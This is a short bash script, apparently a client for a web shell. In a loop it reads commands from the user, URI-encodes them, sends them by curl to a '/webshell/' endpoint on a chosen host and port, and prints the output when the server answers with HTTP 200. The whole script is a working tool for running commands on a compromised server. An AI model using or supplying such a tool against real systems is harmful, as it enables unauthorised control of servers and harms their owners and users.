#!/bin/bash

# 1. Ask user for target host address and port.
read -p 'Host: ' host
read -p 'Port: ' port

while true; do
	# 2. Ask user to enter command to execute.
	read -p '$ ' raw_command
	# Use jq to encode command in URI-encoded string.
	command=$(printf %s "${raw_command}" | jq -sRr @uri)
	# 3. Use -w to specify custom output as HTTP response code with "%{http_code}".
	response=$(curl -s -w "%{http_code}" -o /dev/null "http://${host}:${port}/webshell/${command}")
	http_code=$(tail -n1 <<< "$response")
	
	# Check if the HTTP status code is a valid integer
	if [[ "${http_code}" =~ ^[0-9]+$ ]]; then
		# 4. Check if HTTP code is 200
		if [ "${http_code}" -eq 200 ]; then
			# 5. Send second curl to retrieve output
			curl "http://${host}:${port}/webshell/${command}"
		else
			echo "Error: HTTP status code ${http_code}"
		fi
	else
		echo "Error: Invalid HTTP status code received"
	fi
done
